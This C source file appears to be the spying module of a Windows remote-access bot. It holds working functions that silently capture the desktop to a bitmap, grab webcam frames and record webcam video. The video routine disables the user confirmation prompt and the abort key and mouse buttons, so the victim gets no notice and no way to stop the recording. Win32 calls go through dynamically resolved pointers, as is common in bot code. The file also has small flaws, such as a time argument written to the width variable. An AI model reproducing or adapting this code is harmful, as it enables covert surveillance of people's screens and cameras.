#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_CAPTURE

// globals
HWND Window;

bool Capture(char *file)
{
	HDC hdc, hdc2;
	HBITMAP bitmap;
	BITMAPINFO bmpinfo;
	LPVOID pBits;
	DWORD dwWidth, dwHeight, dwBPP, dwNumColors, dwBytes;
	HGDIOBJ gdiobj;
	HANDLE hfile;

	hdc = fCreateDC("DISPLAY", NULL, NULL, NULL);
	if(hdc == NULL)
		return false;

	dwWidth = fGetDeviceCaps(hdc, HORZRES);
	dwHeight = fGetDeviceCaps(hdc, VERTRES);
	dwBPP = fGetDeviceCaps(hdc, BITSPIXEL);
	if(dwBPP <= 8) {
		dwNumColors = fGetDeviceCaps(hdc, NUMCOLORS);
		dwNumColors = 256;
	} else 
		dwNumColors = 0;

	hdc2 = fCreateCompatibleDC(hdc);
	if(hdc2 == NULL) {
		fDeleteDC(hdc);
		return false;
	}
	bmpinfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmpinfo.bmiHeader.biWidth = dwWidth;
	bmpinfo.bmiHeader.biHeight = dwHeight;
	bmpinfo.bmiHeader.biPlanes = 1;
	bmpinfo.bmiHeader.biBitCount = (WORD) dwBPP;
	bmpinfo.bmiHeader.biCompression = BI_RGB;
	bmpinfo.bmiHeader.biSizeImage = 0;
	bmpinfo.bmiHeader.biXPelsPerMeter = 0;
	bmpinfo.bmiHeader.biYPelsPerMeter = 0;
	bmpinfo.bmiHeader.biClrUsed = dwNumColors;
	bmpinfo.bmiHeader.biClrImportant = dwNumColors;
	bitmap = fCreateDIBSection(hdc, &bmpinfo, DIB_PAL_COLORS, &pBits, NULL, 0);
	if(bitmap == NULL) {
		fDeleteDC(hdc);
		fDeleteDC(hdc2);
		return false;
	}
	gdiobj = fSelectObject(hdc2, (HGDIOBJ)bitmap);
	if((gdiobj == NULL) || (gdiobj == (LPVOID)GDI_ERROR)) {
		fDeleteDC(hdc);
		fDeleteDC(hdc2);
		return false;
	}
	if (!fBitBlt(hdc2, 0,0, dwWidth, dwHeight, hdc, 0,0, SRCCOPY)) {
		fDeleteDC(hdc);
		fDeleteDC(hdc2);
		return false;
	}	
	RGBQUAD colors[256];
	if(dwNumColors != 0) {
		dwNumColors = fGetDIBColorTable(hdc2, 0, dwNumColors, colors);
	}	
	BITMAPFILEHEADER bitmapfileheader;
	BITMAPINFOHEADER bitmapinfoheader;
	bitmapfileheader.bfType = 0x4D42;
	bitmapfileheader.bfSize = ((dwWidth * dwHeight * dwBPP)/8) + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));
	bitmapfileheader.bfReserved1 = 0;
	bitmapfileheader.bfReserved2 = 0;
	bitmapfileheader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (dwNumColors * sizeof(RGBQUAD));  
	bitmapinfoheader.biSize = sizeof(BITMAPINFOHEADER);
	bitmapinfoheader.biWidth = dwWidth;
	bitmapinfoheader.biHeight = dwHeight;
	bitmapinfoheader.biPlanes = 1;
	bitmapinfoheader.biBitCount = (WORD)dwBPP;
	bitmapinfoheader.biCompression = BI_RGB;
	bitmapinfoheader.biSizeImage = 0;
	bitmapinfoheader.biXPelsPerMeter = 0;
	bitmapinfoheader.biYPelsPerMeter = 0;
	bitmapinfoheader.biClrUsed = dwNumColors;
	bitmapinfoheader.biClrImportant = 0;	
	hfile = CreateFile(file,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hfile == INVALID_HANDLE_VALUE) {
		fDeleteObject(bitmap);
		fDeleteDC(hdc2);
		fDeleteDC(hdc);
		return false;
	}
	WriteFile(hfile,&bitmapfileheader,sizeof(BITMAPFILEHEADER), &dwBytes, NULL);
	WriteFile(hfile,&bitmapinfoheader,sizeof(BITMAPINFOHEADER), &dwBytes, NULL);
	if(dwNumColors != 0)
		WriteFile(hfile,colors,sizeof(RGBQUAD)*dwNumColors,&dwBytes,NULL);
	WriteFile(hfile,pBits,(dwWidth*dwHeight*dwBPP)/8,&dwBytes,NULL);
	CloseHandle(hfile);		
	fDeleteObject(bitmap);
	fDeleteDC(hdc2);
	fDeleteDC(hdc);

	return true;
}

int CaptureFrame(char *file, int index, int x, int y)
{
	HWND hwndCap;

	hwndCap = fcapCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, Window, 1);
	if(hwndCap == NULL) {
		return 1;
	}
	if(fcapDriverConnect(hwndCap, index) == FALSE) {
		fDestroyWindow(hwndCap);
		return 1;	
	}
	CAPDRIVERCAPS pcdc;
	fcapDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		fDestroyWindow(hwndCap);
		return 1;
	}
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;
	dwSize = fcapGetVideoFormatSize(hwndCap);
	pbiOrig = (BITMAPINFO *)malloc(dwSize);
	if(pbiOrig == NULL) {
		fDestroyWindow(hwndCap);
		return 1;
	}
	pbiInfo = (BITMAPINFO *)malloc(dwSize);
	if(pbiInfo == NULL) {
		fDestroyWindow(hwndCap);
		return 1;
	}
	fcapGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);
	DWORD dwWidth,dwHeight,dwBPP;
	if(x <= 0) 
		dwWidth = 640;
	else 
		dwWidth = x;
	if(y <= 0) 
		dwHeight = 480;
	else 
		dwHeight = y;
	dwBPP = 16;
	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;
	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;
	fcapSetVideoFormat(hwndCap, pbiInfo, dwSize);
	fcapGrabFrameNoStop(hwndCap);
	fcapFileSaveDIB(hwndCap, file);
	fcapSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	fcapDriverDisconnect(hwndCap); 
	fDestroyWindow(hwndCap);

	return 0;
}

int CaptureVideo(char *file, int index, int time, int x, int y)
{
	HWND hwndCap;
	
	hwndCap = fcapCreateCaptureWindow("Window", WS_CHILD, 0, 0, 160, 120, Window, 1);
	if(hwndCap == NULL)
		return 1;

	if(fcapDriverConnect(hwndCap, index) == false) {
		fDestroyWindow(hwndCap);
		return 1;	
	}	
	CAPDRIVERCAPS pcdc;
	fcapDriverGetCaps(hwndCap, &pcdc, sizeof(CAPDRIVERCAPS));
	if(!pcdc.fCaptureInitialized) {
		fDestroyWindow(hwndCap);
		return 1;
	}	
	DWORD dwSize;
	BITMAPINFO *pbiOrig, *pbiInfo;	
	dwSize = fcapGetVideoFormatSize(hwndCap);
	pbiOrig = (BITMAPINFO *)malloc(dwSize);
	if(pbiOrig == NULL) {
		fDestroyWindow(hwndCap);
		return 1;
	}
	pbiInfo = (BITMAPINFO *)malloc(dwSize);
	if(pbiInfo == NULL) {
		fDestroyWindow(hwndCap);
		return 1;
	}
	fcapGetVideoFormat(hwndCap, pbiOrig, dwSize); 
	memcpy(pbiInfo, pbiOrig, dwSize);
	DWORD dwSeconds=5,dwWidth,dwHeight,dwBPP,dwFPS;
	if(time <= 0) 
		dwSeconds = 5;
	else 
		dwWidth = time;
	if(x <= 0) 
		dwWidth = 160;
	else 
		dwWidth = x;
	if(y <= 0) 
		dwHeight = 120;
	else 
		dwHeight = y;
	dwBPP = 16;
	dwFPS = 15;
	pbiInfo->bmiHeader.biWidth = dwWidth;
	pbiInfo->bmiHeader.biHeight = dwHeight;
	pbiInfo->bmiHeader.biBitCount = (WORD) dwBPP;
	pbiInfo->bmiHeader.biSizeImage = 0;
	pbiInfo->bmiHeader.biCompression = BI_RGB;
	pbiInfo->bmiHeader.biClrUsed = 0;
	pbiInfo->bmiHeader.biClrImportant = 0;
	pbiInfo->bmiHeader.biPlanes = 1;	
	pbiInfo->bmiColors->rgbBlue = 0;
	pbiInfo->bmiColors->rgbGreen = 0;
	pbiInfo->bmiColors->rgbRed = 0;
	pbiInfo->bmiColors->rgbReserved = 0;	
	CAPTUREPARMS capparms;	
	fcapSetVideoFormat(hwndCap, pbiInfo, dwSize);
	fcapCaptureGetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));		
	capparms.fMakeUserHitOKToCapture = false;
	capparms.vKeyAbort = 0;
	capparms.fAbortLeftMouse = false;
	capparms.fAbortRightMouse = false;
	capparms.fLimitEnabled = true;
	capparms.wTimeLimit = dwSeconds;
	capparms.dwRequestMicroSecPerFrame = (1000000/dwFPS);																		
	fcapCaptureSetSetup(hwndCap, &capparms, sizeof(CAPTUREPARMS));
	fcapFileSetCaptureFile(hwndCap, file); 								
	fcapCaptureSequence(hwndCap); 
	fcapSetVideoFormat(hwndCap, pbiOrig, dwSize);
	free(pbiOrig);
	free(pbiInfo);
	fcapDriverDisconnect(hwndCap); 
	fDestroyWindow(hwndCap);

	return 0;
}
#endif